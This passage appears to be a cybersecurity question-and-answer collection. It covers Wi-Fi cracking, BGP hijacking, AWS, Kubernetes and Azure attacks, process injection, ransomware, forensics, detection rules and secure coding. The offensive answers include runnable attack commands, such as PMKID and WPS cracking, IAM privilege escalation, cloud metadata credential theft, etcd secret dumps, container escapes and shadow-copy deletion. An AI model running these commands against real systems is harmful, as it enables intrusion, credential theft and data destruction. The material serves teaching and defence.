(3) PMKID attack (no deauth needed, works without clients): hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1 (captures PMKID from AP beacon/association frames); hcxpcapngtool capture.pcapng -o hashes.22000; hashcat -m 22000 hashes.22000 wordlist.txt; PMKID = HMAC-SHA1(PMK, 'PMK Name' + AP_MAC + CLIENT_MAC) -- can be brute forced without client. (4) WPS PIN attack: wash -i wlan0mon finds WPS-enabled APs; reaver -i wlan0mon -b AP_MAC -vv; 8-digit WPS PIN = two 4-digit halves checked separately = 11000 combinations max; disabled/rate-limited on modern routers. (5) Evil twin: hostapd-wpe creates rogue AP with same SSID; captures MSCHAPv2 credentials for WPA2-Enterprise; crack with asleap. Defense: WPA3 (SAE handshake -- immune to offline dictionary attacks); long random PSK (>16 chars); disable WPS; use 802.1X for enterprise.
Explain BGP hijacking and how it is used for traffic interception.

BGP (Border Gateway Protocol) is the internet's routing protocol -- it routes packets between autonomous systems (AS). BGP is based on trust: routers accept route announcements from peers without cryptographic verification. BGP hijacking: (1) An AS announces ownership of an IP prefix it doesn't own (e.g., announces 192.0.2.0/24 owned by Amazon); (2) BGP route selection prefers more specific prefixes -- if hijacker announces /25 sub-prefix, it wins over /24 by route specificity; (3) Internet routers propagate the hijacked route; (4) Traffic destined for the victim prefix routes to hijacker instead. Types: (a) Black hole -- hijacker drops traffic (DDoS); (b) Traffic interception -- hijacker forwards to real destination after inspection (spy/credential capture); (c) Prefix hijack for spam -- use IP space to send spam without reputation damage to own IPs. Notable incidents: 2010 China Telecom leaked 50,000 prefixes for 18 minutes; 2018 Amazon Route 53 BGP hijack to steal cryptocurrency; 2019 Rostelecom hijacked Google, Apple, Facebook prefixes. Detection: RIPE NCC BGPmon, Team Cymru, RouteViews monitor BGP tables; compare against WHOIS registration; BGPStream for real-time alerts. Defense: RPKI (Resource Public Key Infrastructure) -- cryptographically signs route origin authorisations (ROAs); routers validate that announced AS is authorised to originate the prefix; Route Origin Validation (ROV) with RPKI is the current best defense; not universally deployed.
How do you enumerate and attack an AWS environment after gaining initial access?

AWS post-compromise enumeration: (1) Identify current principal: aws sts get-caller-identity (returns Account, ARN, UserId). (2) Enumerate permissions: try aws iam get-user; aws iam list-attached-user-policies; aws iam list-user-policies (inline); if role: aws iam list-attached-role-policies --role-name ROLE. (3) Automated enum: enumerate-iam (https://github.com/andresriancho/enumerate-iam) tries hundreds of API calls to find allowed actions. (4) Pacu (AWS exploitation framework): pacu session creation; import credentials; run modules: iam__enum_permissions, s3__enum_buckets, ec2__enum. (5) S3: aws s3 ls (list all buckets); aws s3 ls s3://bucket-name (list bucket); aws s3 cp s3://bucket/sensitive.txt.; check bucket policies: aws s3api get-bucket-policy --bucket name. (6) Secrets: aws secretsmanager list-secrets; aws secretsmanager get-secret-value --secret-id name; aws ssm get-parameters --names /prod/db/password --with-decryption. (7) EC2 metadata: if on EC2 instance: curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE. (8) Lambda: aws lambda list-functions; aws lambda get-function --function-name name (download code with S3 URL); look for credentials in environment variables. (9) Privilege escalation: iam:PassRole + ec2:RunInstances -- create instance with higher-privilege role; iam:CreateAccessKey on other users; iam:AttachUserPolicy -- attach AdministratorAccess to self. CloudTrail logs all API calls -- avoid noisy calls; use read-only enum first.
Explain AWS IAM privilege escalation techniques.

AWS IAM privilege escalation paths (Rhino Security research): (1) iam:CreateAccessKey -- if allowed on other users: create access key for admin user; aws iam create-access-key --user-name admin. (2) iam:CreateLoginProfile -- create console password for admin user without MFA. (3) iam:AttachUserPolicy -- attach AdministratorAccess to own user: aws iam attach-user-policy --user-name self --policy-arn arn:aws:iam::aws:policy/AdministratorAccess. (4) iam:AttachRolePolicy -- attach admin policy to a role you can assume. (5) iam:PutUserPolicy -- add inline policy granting * on * to self. (6) iam:PassRole + ec2:RunInstances -- create EC2 instance with admin role attached; access instance metadata to get role credentials. (7) iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction -- create Lambda with admin role; invoke function that calls sts:AssumeRole or iam:CreateAccessKey. (8) iam:PassRole + glue:CreateDevEndpoint -- create Glue dev endpoint with admin role; endpoint has IAM credentials accessible. (9) sts:AssumeRole -- if allowed to assume a role with broader permissions. (10) codestar:CreateProject -- creates role with admin access automatically. (11) datapipeline:CreatePipeline + iam:PassRole -- pipeline runs as admin role. Each path requires specific combination of permissions; Pacu module iam__privesc_scan checks for all known paths automatically.
How do you attack Kubernetes clusters and what are common misconfigurations?

Kubernetes attack surface: (1) Unauthenticated API server -- kubectl get pods --server=https://k8s:6443 (if anonymous auth enabled): full cluster control. (2) SSRF to metadata API from pod -- from compromised pod: curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ (AWS node role credentials -- can enumerate/access cloud resources). (3) Service account token -- every pod has a service account; token mounted at /var/run/secrets/kubernetes.io/serviceaccount/token; use token with kubectl: kubectl --token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) get secrets -n kube-system (if RBAC is misconfigured). (4) Privileged pod escape -- if pod has privileged: true: mount host filesystem: nsenter --target 1 --mount --uts --ipc --net --pid -- bash (executes in host PID namespace = node access). (5) hostPID/hostNetwork -- access host processes and network; can sniff traffic, attack other pods. (6) Writable host path mount -- pod mounts /etc or /var/lib/kubelet: write cron job, modify kubelet config. (7) etcd access -- etcd stores all cluster secrets; if accessible (port 2379): etcdctl get / --prefix keys to dump all secrets. (8) Kubelet API (port 10250) -- if unauthenticated: list pods, exec commands in any pod on node: curl -k https://node:10250/exec/namespace/pod/container -d 'command=id'. (9) Docker socket mount -- /var/run/docker.sock in pod = full node control: docker run -v /:/host --rm -it alpine chroot /host. Automated tools: kube-hunter scans for vulnerabilities; trivy for image scanning.
What are the main Azure AD attack techniques?

Azure AD (now Entra ID) attack techniques: (1) Password spray -- use MSOLSpray or Spray365 against login.microsoftonline.com; spray common passwords (Seasons+Year) across all enumerated UPNs; look for AADSTS50055 (password expired = valid credential), AADSTS50076 (MFA required = valid credential). (2) Device code phishing -- initiate device code flow: GET https://login.microsoftonline.com/common/oauth2/devicecode?client_id=...; present code+URL to victim via phishing; victim authenticates; attacker polls for token; token grants access as victim without MFA bypass (MFA is completed by victim). (3) Consent phishing -- malicious Azure app requests permissions (Mail.Read, Files.ReadWrite); victim consents; attacker's app has delegated access to victim's mailbox and OneDrive; no credential theft needed. (4) Pass the PRT (Primary Refresh Token) -- PRT is stored in Windows LSASS; extract with ROADtools/AADInternals: Invoke-AADIntDeviceTransportLayerSecurity -GetNonce; inject PRT cookie into browser to bypass MFA. (5) Golden SAML -- steal ADFS token signing certificate (from ADFS server); forge SAML assertions for any user to access any service provider (federating to Azure AD); equivalent to Golden Ticket in cloud. (6) Azure Managed Identity abuse -- compromised VM with managed identity: curl http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com; token grants access to Azure management plane. Tools: AADInternals, ROADtools, BloodHound with AzureHound.
Explain static and dynamic malware analysis methodology.

Malware analysis phases: STATIC ANALYSIS (without executing): (1) File identification -- file malware.exe; strings malware.exe (extract ASCII/Unicode strings -- URLs, IPs, registry keys, function names are gold); compute hash: md5sum / sha256sum -> submit to VirusTotal. (2) PE analysis -- pestudio, PE-bear: check imports (suspicious: CreateRemoteThread, VirtualAllocEx, WriteProcessMemory = process injection; InternetOpenUrl, HttpSendRequest = C2; RegSetValueEx = persistence; CryptEncrypt = ransomware); check sections (UPX or unusual section names = packed;.text section with high entropy = encrypted code); check resources (icons, version info, embedded payloads). (3) Packer detection -- ExeinfoPE, DetectItEasy; if packed, unpack before analysis: OllyDbg/x64dbg find OEP (original entry point) and dump. (4) Disassembly -- IDA Pro or Ghidra; analyze main() and DllMain; trace execution flow; identify anti-analysis tricks. DYNAMIC ANALYSIS (in sandbox): (1) Sandbox -- Cuckoo, Any.run, Triage; observe: process creation (ProcMon), network connections (Wireshark), file system changes (Process Monitor), registry modifications. (2) API monitoring -- API Monitor or frida traces all Windows API calls with arguments; reveals decrypted strings, C2 URLs, injected process. (3) Network analysis -- Wireshark + FakeNet-NG (simulates DNS/HTTP/HTTPS responses) to capture C2 traffic patterns. (4) Debugging -- x64dbg with ScyllaHide (anti-anti-debug); set breakpoints on interesting APIs; inspect memory for decrypted payloads. Combine both approaches: static reveals code paths, dynamic confirms behavior.
How does process injection work and what are common techniques?

Process injection executes malicious code within the address space of a legitimate process to evade defenses and inherit process trust. Techniques: (1) Classic DLL injection -- OpenProcess(PROCESS_ALL_ACCESS, pid); VirtualAllocEx to allocate memory in target; WriteProcessMemory to write DLL path; CreateRemoteThread with LoadLibraryA as start address -> target loads attacker DLL. (2) Process hollowing -- CreateProcess in SUSPENDED state; ZwUnmapViewOfSection unmaps legitimate executable; VirtualAllocEx + WriteProcessMemory writes malicious PE; SetThreadContext changes EIP to new entry point; ResumeThread. (3) Reflective DLL injection -- DLL bootstraps itself into memory without LoadLibrary; no DLL path written to disk; used by Cobalt Strike and Metasploit. (4) Process doppelganging -- uses NTFS transactions (TxF): create transaction; write malicious file inside transaction; create section object from transacted file; rollback transaction (file on disk unchanged); inject section into process memory. Evades hash-based file scanning. (5) Process herpaderping -- similar to doppelganging but overwrites the PE file on disk after creating process; AV scans the overwritten (benign) file. (6) Atom bombing -- use Windows Atom table (GlobalAddAtom) to write shellcode; APC injection to execute. (7) Thread hijacking -- OpenThread on existing thread; SuspendThread; GetThreadContext; modify RIP/EIP to shellcode; SetThreadContext; ResumeThread. (8) Early Bird APC -- inject APC before thread starts executing in newly created process; very early execution. Defense: Kernel Patch Protection; PatchGuard; PPL (Protected Process Light); EDR hooks on injection APIs.
Explain command and control (C2) frameworks and their evasion techniques.

C2 frameworks provide post-exploitation control of compromised hosts. Major frameworks: (1) Cobalt Strike -- commercial; Beacon payload; malleable C2 profiles mimic legitimate traffic (Amazon, Google, Slack); Beacon sleeps and beacons back at configurable intervals; supports SMB beacons (lateral movement over named pipes, no external traffic); DNS beacons (very stealthy). (2) Metasploit Meterpreter -- open source; staged (tiny stager downloads full Meterpreter) or stageless; HTTPS with self-signed cert (detectable). (3) Sliver -- open source Cobalt Strike alternative; mTLS, WireGuard, HTTP/S, DNS C2; implant is Go binary; unique per-session certificates. (4) Havoc -- newer framework, Go-based, configurable headers. (5) Brute Ratel C4 -- commercial; designed to evade EDR; no typical beacon patterns. Evasion techniques: (1) Domain fronting -- route C2 through CDN (Cloudflare, AWS CloudFront); TLS SNI shows CDN domain but Host header routes to C2; content filters see CDN traffic. (2) Redirectors -- C2 traffic goes to a redirector VPS first; redirector proxies to real C2 server; hides real C2 IP; Apache rewrite rules forward only beacon traffic, serve legitimate content to scanners. (3) Living-off-the-land -- use signed Windows binaries (regsvr32, mshta, certutil, bitsadmin) to download and execute payloads; blend with legitimate admin traffic. (4) Sleep obfuscation -- encrypt beacon in memory during sleep; only decrypt when executing; evades memory scanning EDRs. (5) Process injection into signed processes -- inject into Explorer, svchost, Teams.
How does ransomware work technically and how do you defend against it?

Ransomware technical operation: (1) Initial access -- phishing email with macro-enabled Office doc; exploit kits; RDP brute force; supply chain compromise. (2) Execution and persistence -- VBA macro drops loader; persistence via Run key, scheduled task, startup folder. (3) Reconnaissance -- enumerate network shares (net view /all); identify backup systems, domain controllers, high-value file servers; use ADFind, BloodHound if time permits. (4) Lateral movement -- PsExec, WMI, stolen credentials, Cobalt Strike (commercial ransomware groups buy access). (5) Backup destruction -- delete VSS (Volume Shadow Copies): vssadmin delete shadows /all /quiet; bcdedit /set recoveryenabled no; disable backup agents; attack backup server (critical step that makes recovery impossible without offline backups). (6) Data exfiltration -- upload sensitive data to attacker's cloud storage (double extortion leverage); common tools: rclone, MEGASync, custom. (7) Encryption -- hybrid: generate random symmetric key (AES-256); encrypt files; encrypt symmetric key with attacker's public RSA key; only attacker's private key can decrypt. File extensions changed; ransom note dropped. Technically: encrypt in-place or swap files; skip specific extensions to keep OS bootable; encrypt network shares. Defense: (1) Immutable offline backups (most critical); (2) Network segmentation to contain spread; (3) Disable unnecessary lateral movement paths (SMB signing, LAPS, tiered admin); (4) EDR for behavioral detection (encryption activity, VSS deletion); (5) Email filtering for macro-enabled documents; (6) Privileged Access Workstations.
How do you perform Windows memory forensics?

Windows memory forensics with Volatility 3: (1) Identify profile: vol.py -f memory.dmp windows.info (Windows version, build). (2) Process listing: vol.py -f memory.dmp windows.pslist (running processes with PID, PPID, start time); windows.pstree (parent-child hierarchy -- suspicious: cmd.exe spawned by Word = macro execution); windows.psscan (finds hidden processes by scanning pool tags, bypasses DKOM rootkits). (3) Network connections: windows.netstat (established and listening connections with associated PID -- correlate suspicious process to C2 connection). (4) DLL analysis: windows.dlllist --pid PID (loaded DLLs; unknown or unsigned DLLs in wrong paths); windows.malfind (finds injected code -- VAD regions marked PAGE_EXECUTE_READWRITE without a backing file on disk = injected shellcode). (5) Memory strings: strings memory.dmp | grep -E '(http|ftp|\d{1,3}\.\d{1,3}\.\d{1,3})' (C2 IPs/URLs in memory). (6) Registry hives: windows.registry.hivelist; windows.registry.printkey -- read in-memory registry including HKCU\Software\Microsoft\Windows\CurrentVersion\Run. (7) Command history: windows.cmdline (process command lines); windows.consoles (console history -- commands typed in cmd.exe). (8) Files: windows.filescan (all file objects in memory); windows.dumpfiles --virtaddr ADDR (extract file from memory). (9) Handles: windows.handles --pid PID (open handles -- files, registry keys, events -- reveal C2 mutex names). Artifacts of interest: Meterpreter injects into existing process -- malfind reveals it; Cobalt Strike beacon memory is XOR-encrypted but malfind finds the region.
Explain Linux forensics -- what artifacts to collect and how to analyze them.

Linux incident response artifact collection: (1) Memory -- avml or LiME kernel module for full memory acquisition; analyze with Volatility 3 linux profile; look for injected code, network connections, process hollowing. (2) Running processes: /proc/<pid>/maps (memory mappings); /proc/<pid>/fd (open file descriptors); /proc/<pid>/net/tcp (network connections); /proc/<pid>/cmdline (command line arguments). (3) Persistence locations: /etc/cron*; /var/spool/cron/crontabs/; /etc/systemd/system/*.service; /etc/init.d/; ~/.bashrc ~/.profile ~/.bash_profile (check for added lines); /etc/rc.local; /etc/ld.so.preload (LD_PRELOAD rootkits -- loads attacker library for every process). (4) Authentication logs: /var/log/auth.log (Debian/Ubuntu) or /var/log/secure (RHEL) -- SSH logins, sudo usage, failed auth; last and lastb (login/logout history, failed logins); /var/log/wtmp (binary, use last); ~/.bash_history (often cleared by attackers -- check timestamps, look for gaps, check other users). (5) Network: ss -antp (current connections); netstat -antp; /proc/net/tcp; iptables -L (check for malicious rules). (6) File system: recently modified files: find / -mtime -7 -type f -not -path '/proc/*' 2>/dev/null; check SUID files; strings on suspicious binaries; md5sum against known-good baseline. (7) Rootkit detection: chkrootkit; rkhunter --check; compare ps output with /proc entries (discrepancy = DKOM rootkit hiding process). Timeline: mactime from Autopsy on disk image correlates file system timestamps.
How do you investigate a phishing email -- technical analysis steps?

Phishing email technical analysis: (1) Preserve raw email -- download as.eml or.msg; do NOT click links from email client; export from mail server logs. (2) Email headers analysis: trace Received headers bottom-up (earliest hop first) to find true originating IP; check SPF (did sending IP match domain's SPF record?): look for 'spf=pass' or 'spf=fail' in Authentication-Results; DKIM signature valid? (dkim=pass); DMARC alignment? (dmarc=pass/fail); check X-Originating-IP, X-Mailer for email client fingerprinting. (3) Sender analysis: check Return-Path vs From (spoofed if different); WHOIS on sending domain (recently registered = suspicious); check domain reputation: VirusTotal, IBM X-Force, MXToolbox. (4) Link analysis -- extract URLs without clicking: emlAnalyzer -i email.eml --url; URL decode: %2F -> /; check redirects without visiting: curl -I -L URL (follow redirects); submit to URLscan.io (safe sandbox renders page); VirusTotal URL scan. (5) Attachment analysis -- file type: file attachment.bin; hash -> VirusTotal; if PDF: pdf-parser.py, pdfid.py (check for embedded JavaScript, URIs, launch actions); if Office: olevba.py macro_doc.doc (extracts and analyzes VBA macros). (6) Infrastructure pivoting: registrant email, hosting IP -> find related malicious domains; PassiveTotal / SecurityTrails for historical data. (7) IOC extraction: email sender, sending IP, links, attachment hashes, C2 IPs in macros; submit to SIEM/SOAR for hunting across all mailboxes.
What is threat hunting and how do you conduct a hunt?

Threat hunting is proactive, human-driven search for threats that have evaded automated detection. Three approaches: (1) Hypothesis-driven -- form hypothesis based on threat intelligence (e.g., 'APT29 uses DLL sideloading into legitimate signed binaries'); search for that specific TTP in logs/endpoints. (2) IOC-driven -- use IOCs from threat report (hashes, IPs, domains, registry keys); search SIEM and endpoint data for matches. (3) Anomaly-driven -- use analytics to find statistical outliers; investigate anomalies manually. Hunt methodology: (1) Define scope and hypothesis -- 'Looking for living-off-the-land lateral movement using WMI'. (2) Data requirements -- identify necessary data sources: process creation logs (Sysmon Event ID 1), network connections (Sysmon 3), WMI activity (Sysmon 19/20/21, Windows 4688 with cmd line logging). (3) Hunt -- query SIEM: index=sysmon EventID=20 (WmiEventConsumer -- WMI persistence) | stats count by Computer, Destination; or SPL: index=windows EventCode=4688 Process_Name=*wmic.exe CommandLine=* | regex CommandLine='process call create'; look for wmic spawning cmd.exe or powershell with encoded commands. (4) Investigate findings -- pivot on suspicious process: parent-child chain, network connections, file activity. (5) Escalate or close -- confirmed threat -> IR; false positive -> document and refine query. (6) Improve detection -- convert successful hunt into automated detection rule (SIGMA rule -> convert to SIEM query). Document hunts in a hunt log with hypothesis, data sources, queries, findings.
How do you write Sigma rules for threat detection?

Sigma is a generic signature format for SIEM rules -- write once, convert to any SIEM query (Splunk, Elastic, QRadar, Chronicle). Rule structure: title, id (UUID), status (experimental/test/stable), description, references, author, date, logsource (category, product, service), detection, falsepositives, level (informational/low/medium/high/critical), tags (ATT&CK). Example -- detecting Mimikatz via LSASS access: title: Mimikatz LSASS Memory Access; logsource: category: process_access; product: windows; detection: selection: TargetImage|endswith: '\lsass.exe'; GrantedAccess|contains: ['0x1010', '0x1038', '0x1fffff']; condition: selection; falsepositives: AV products, Sysinternals; level: high. Example -- suspicious PowerShell encoding: logsource: category: process_creation; product: windows; detection: selection: Image|endswith: '\powershell.exe'; CommandLine|contains: ['-enc', '-encodedcommand', '-ec ']; condition: selection; level: medium. Conversion: sigmac -t splunk rule.yml -> Splunk SPL; sigmac -t es-qs -> Elasticsearch query string; pySigma for modern conversion. Best practices: use |contains, |startswith, |endswith for flexible matching; combine multiple selections with and/or; use NOT conditions for FP reduction; tag with MITRE ATT&CK (tags: attack.credential_access, attack.t1003.001); test against known-good and known-bad events before deployment.
Explain how to use Splunk SPL for security investigations.

Splunk SPL (Search Processing Language) for security operations: Core syntax: index=sysmon | search terms | commands. Key commands for SOC: (1) Basic search: index=windows EventCode=4625 | stats count by Account_Name, Source_Network_Address | sort -count (failed logins by user and source IP -- detect password spray). (2) Subsearch: index=windows EventCode=4624 [search index=windows EventCode=4625 | stats count by Account_Name | where count > 10 | fields Account_Name] (successful login after multiple failures). (3) Time chart: index=proxy | timechart span=1h count by category (traffic category over time). (4) Transaction: index=windows | transaction Account_Name startswith=EventCode=4625 endswith=EventCode=4624 maxspan=30m (group failed then successful logins per account). (5) Regex extraction: index=dns | rex field=query '(?P<domain>[^.]+\.[^.]+)$' | stats dc(query) as unique_subdomains count by domain | where unique_subdomains > 100 (high unique subdomain count = DGA). (6) Correlation: index=proxy dest_ip=* | join dest_ip [search index=firewall action=blocked] | table _time src_ip dest_ip url (proxied requests that hit firewall blocks). (7) Outlier detection: index=sysmon EventCode=1 | stats count by ParentImage, Image | eventstats avg(count) as avg stdev(count) as std by ParentImage | where count > avg + (2*std) (unusual child processes). (8) Alert tuning: add NOT conditions to known FPs. Useful lookups: threat intel CSVs as lookup tables for IOC matching: | lookup threat_intel ip AS src_ip OUTPUT threat_category.
How do you conduct a code review for security vulnerabilities?

Security code review methodology: (1) Understand the application -- architecture, data flows, trust boundaries, authentication model; read README, API documentation. (2) Define threat model -- what are the crown jewels? Who are adversaries? Entry points (web, API, file upload, message queue). (3) Focus on high-risk areas first: authentication and session management, input validation and output encoding, access control (every request checks authorisation?), cryptographic implementations, third-party library usage. (4) Grep for dangerous patterns -- Python: grep -rn 'eval\|exec\|subprocess\|shell=True\|pickle.loads\|yaml.load(' src/; PHP: grep -rn 'system\|exec\|shell_exec\|passthru\|eval\|include.\$_'; Java: grep -rn 'Runtime.exec\|ProcessBuilder\|createQuery.*\+\|Statement.*\+' src/. (5) Trace data flows -- follow user input from entry point to sink (database query, file system, eval, subprocess); look for missing sanitisation steps. (6) Check cryptography -- MD5/SHA1 for passwords (weak); static or hardcoded keys; weak random (rand() not crypto-safe); ECB mode. (7) Error handling -- stack traces exposed to users; broad catch blocks swallowing exceptions silently. (8) Race conditions -- check-then-act patterns (check if user has balance, then debit) without locking. (9) Dependency audit -- pip audit, npm audit, OWASP dependency-check; look for CVEs in pinned versions. (10) Tools: Semgrep (configurable SAST with community rules for OWASP Top 10); Bandit (Python); CodeQL; SonarQube; combine with manual review for logic flaws tools miss.
Explain secure code practices for preventing injection vulnerabilities.

Injection prevention (SQL, Command, LDAP, XPath, NoSQL): (1) Parameterised queries / prepared statements (PRIMARY defense for SQL): Python: cursor.execute('SELECT * FROM users WHERE username = %s AND password = %s', (username, password)) -- parameters never interpreted as SQL regardless of content; Java: PreparedStatement ps = conn.prepareStatement('SELECT * FROM users WHERE id = ?'); ps.setInt(1, userId). (2) Stored procedures -- if written safely (no dynamic SQL inside). (3) Input validation -- whitelist allowed characters: usernames: ^[a-zA-Z0-9_]{3,30}$; reject input not matching pattern BEFORE processing. (4) ORM usage -- SQLAlchemy, Hibernate use parameterised queries by default; avoid raw query methods (.raw() in Django, createNativeQuery in JPA) with string concatenation. (5) Command injection prevention -- never pass user input to shell; use language APIs with argument arrays: Python subprocess.run(['ls', user_input]) (not shell=True); Java ProcessBuilder with list of args (not Runtime.exec(string)). (6) Output encoding for XSS -- HTML-encode all user content displayed in HTML: and->& less->< greater->> quote->" use templating engine auto-escaping (Jinja2, Django templates, Thymeleaf) -- safe by default. (7) NoSQL injection -- MongoDB: never use user input in $where clause; use typed query builders. (8) LDAP injection -- escape special chars: () * \ \0 before embedding in LDAP filter. (9) Content Security Policy -- defense in depth for XSS even if encoding missed. Defense in depth: validate input + parameterise queries + least-privilege DB account + WAF as additional layer.
How does JWT work and what are the common vulnerabilities?

JWT (JSON Web Token) format: base64url(header).base64url(payload).base64url(signature). Header: {alg: HS256, typ: JWT}. Payload: {sub: userId, role: user, exp: timestamp}. Signature: HMAC-SHA256(secret, header.payload) or RSA signature. Vulnerabilities: (1) Algorithm confusion (alg:none) -- change header to {alg: none}; remove signature; if server accepts: forge any payload (role: admin, sub: any_user). Fix: explicitly validate expected algorithm server-side; never accept 'none'. (2) RS256 to HS256 confusion -- if server uses RSA (RS256) but also supports HS256: change alg to HS256; sign with the server's PUBLIC key (which is typically published); server verifies HMAC with its public key (same key used to sign). Fix: reject algorithm changes; use algorithm-specific verification. (3) Weak secret -- if HS256 with short/guessable secret: hashcat -a 0 -m 16500 token.jwt wordlist.txt cracks the secret; then forge any token. Fix: use 256-bit random secret. (4) Missing expiration -- JWT with no exp claim is valid forever; if stolen, permanent access. (5) Sensitive data in payload -- payload is base64-encoded NOT encrypted; anyone with token can read payload; never put passwords, PII in JWT payload. (6) Missing signature validation -- some libraries return decoded payload even if signature check fails (CVE in jsonwebtoken < 9.0). (7) JWT header injection -- kid (key ID) parameter used to look up signing key; if kid is passed to DB query or file path without sanitisation: SQL injection or path traversal in key lookup. Fix: whitelist kid values; use library that safely handles kid.
How do you harden Docker containers and images?

Docker security hardening: IMAGE HARDENING: (1) Use minimal base images -- Alpine (5MB) or distroless; fewer packages = smaller attack surface; avoid full Ubuntu/Debian unless needed. (2) Run as non-root -- USER appuser in Dockerfile; most container breakouts require root inside container; user namespace remapping adds another layer. (3) Read-only filesystem -- --read-only flag; mount tmpfs for required writable directories: --tmpfs /tmp; prevents attacker writing persistence. (4) No secrets in image -- never ADD credentials, API keys in Dockerfile; use BuildKit secrets: RUN --mount=type=secret; or inject at runtime via environment/volume/secrets manager. (5) Multi-stage builds -- copy only final binary to production image; dev dependencies, build tools not in production image. (6) Scan images -- trivy image myapp:latest; Snyk container test; scan in CI pipeline before push. RUNTIME HARDENING: (7) Drop capabilities -- --cap-drop ALL --cap-add only required (e.g., NET_BIND_SERVICE for web server). (8) seccomp profile -- --security-opt seccomp=profile.json blocks unused syscalls; Docker default profile blocks ~44 syscalls; custom profiles more restrictive. (9) AppArmor/SELinux -- --security-opt apparmor=docker-default (enabled by default on supported hosts). (10) No privileged mode -- --privileged=true is a container escape; never use unless absolutely required. (11) Resource limits -- --memory 512m --cpus 0.5 prevents DoS. (12) Network -- use user-defined networks; don't use --network host; disable inter-container communication where not needed.
Walk through the NIST incident response lifecycle.

NIST SP 800-61 Incident Response Lifecycle -- four phases: PHASE 1 -- PREPARATION: Build IR capability before incidents occur; establish IR policy and plan; create IR team (CSIRT); deploy monitoring (SIEM, EDR, NDR); maintain jump bags (forensic tools, clean OS images, IR playbooks); tabletop exercises; define severity levels and escalation paths; establish communication plan (who to notify for ransomware: legal, comms, C-suite, regulators). PHASE 2 -- DETECTION AND ANALYSIS: Alert triage -- is this a true positive or false positive?; determine incident type (malware, data breach, DDoS, insider threat); determine scope -- how many systems affected, what data exposed?; prioritise by impact to business operations; document timeline: first seen, initial access vector, lateral movement, data access; use log analysis, memory forensics, EDR telemetry; assign severity (P1 critical if active threat in production, P2 high if contained but breach, P3 medium for isolated malware). PHASE 3 -- CONTAINMENT, ERADICATION, AND RECOVERY: Short-term containment: isolate affected systems from network (don't power off -- preserve memory evidence; isolate at network switch or firewall level); reset compromised credentials; block C2 indicators at firewall/DNS. Eradication: remove malware, close access vector (patch vulnerability, disable compromised account), identify and remove all persistence mechanisms. Recovery: restore from clean backups; rebuild compromised systems; monitor closely for re-compromise. PHASE 4 -- POST-INCIDENT ACTIVITY: Document lessons learned within 2 weeks; root cause analysis; update detections and playbooks; report to management; notify regulators if required (GDPR 72-hour notification).
How do you respond to a ransomware incident?

Ransomware IR playbook: IMMEDIATE (first hour): (1) Confirm incident -- identify ransom note, encrypted file extensions, process creating encrypted files (EDR telemetry); confirm it's ransomware not a false alarm. (2) Isolate affected systems -- disconnect from network at switch/firewall level (not power off); preserve memory (contains decryption keys in memory for some families); stop the spread. (3) Identify scope -- how many systems encrypted? Is the backup server affected? Are the domain controllers compromised? (4) Notify stakeholders -- CISO, legal, executive leadership; activate crisis communications plan; prepare for potential regulatory notification. (5) Do NOT pay immediately -- assess: are backups available and clean? Is the decryption key available (NoMoreRansom.org has keys for many families)? INVESTIGATION: (6) Identify initial access vector -- phishing email? Exposed RDP? VPN vulnerability? (7) Timeline reconstruction -- when did attacker first get in, how long have they been present, what did they access/exfiltrate? (8) Identify all affected accounts -- disable and reset; attacker likely has multiple persistence mechanisms. (9) Check for data exfiltration -- review firewall/proxy logs for large outbound transfers in the days before encryption; check for rclone, MEGASync processes. RECOVERY: (10) Restore from clean pre-infection backups (verify with hash); prioritise critical systems; rebuild DCs from scratch if compromised. (11) Harden before reconnecting -- patch initial access vector, enforce MFA on all remote access, implement network segmentation. (12) Monitor closely for 30 days for re-compromise.
How do you implement security in a CI/CD pipeline?

DevSecOps CI/CD security integration: (1) Pre-commit hooks -- git hooks run SAST and secret scanning before commit: pre-commit framework with detect-secrets (prevents committing API keys, passwords); bandit for Python; eslint-plugin-security for JavaScript; developers get fast feedback without breaking workflow. (2) SAST in CI -- Semgrep (fast, configurable rules) or SonarQube in CI job; fail pipeline on new high/critical findings; don't fail on all findings initially (noise); tune rules to reduce FPs; results in MR comments. (3) Dependency scanning -- npm audit, pip-audit, OWASP dependency-check, Snyk or Dependabot; auto-create MRs for dependency updates; fail on Critical CVEs in direct dependencies. (4) Secret scanning -- GitLeaks or Trufflehog scan git history and current commit for secrets; run in CI and as pre-commit; rotate any found secrets immediately. (5) Container image scanning -- Trivy or Snyk container in CI before push to registry; fail on Critical CVEs in base image or application packages; use minimal base images to reduce findings. (6) Infrastructure as Code scanning -- Checkov or Terrascan scans Terraform, CloudFormation, Kubernetes YAML for misconfigurations (S3 bucket public, security group 0.0.0.0/0 on port 22, no encryption). (7) DAST -- OWASP ZAP API scan against deployed staging environment; automated spider and active scan; integrates with pipeline. (8) Policy as code -- OPA/Gatekeeper for Kubernetes admission control; Sentinel for Terraform Cloud. (9) Artifact signing -- sign container images with Cosign; verify signature on deployment. (10) SBOM generation -- syft generates Software Bill of Materials; attach to release artifacts for supply chain tracking.
How do you detect and prevent secrets from leaking in code repositories?

Secret leakage prevention: WHY IT HAPPENS: developers hardcode credentials for convenience, forget to remove test credentials, commit.env files accidentally, or leave tokens in configuration files committed to git. HOW TO FIND LEAKED SECRETS: (1) TruffleHog -- deep git history scan: trufflehog git https://github.com/org/repo --only-verified; finds high-entropy strings and known secret patterns (AWS keys, GitHub tokens, Stripe keys) across all commits including deleted ones. (2) GitLeaks -- gitleaks detect --source=/path/to/repo; configurable with regex rules; runs as pre-commit hook and CI job. (3) GitHub Secret Scanning -- built-in for public and private repos (with Advanced Security); scans for 200+ known patterns; auto-revokes some tokens (GitHub tokens, AWS keys) on detection. (4) Git history mining -- git log -p | grep -E '(password|secret|key|token).*=' | grep -v '#' for manual review. PREVENTION: (1) Pre-commit hooks -- detect-secrets baseline (creates baseline of known FPs); blocks commits with new secrets. (2).gitignore -- add.env, *.pem, *_credentials.json, config/secrets.yml to.gitignore by default; use gitignore.io templates. (3) Secret management -- use Vault, AWS Secrets Manager, Azure Key Vault, or environment variables injected by CI; never hardcode credentials. (4) Environment-specific config -- 12-factor app: config in environment; code has no secrets; separate config from code. RESPONSE to leaked secret: (1) Rotate immediately (assume compromised); (2) Revoke old credential; (3) Check audit logs for unauthorized use; (4) Remove from git history: git filter-repo --path secret_file --invert-paths; force-push to all branches; notify all collaborators to re-clone.
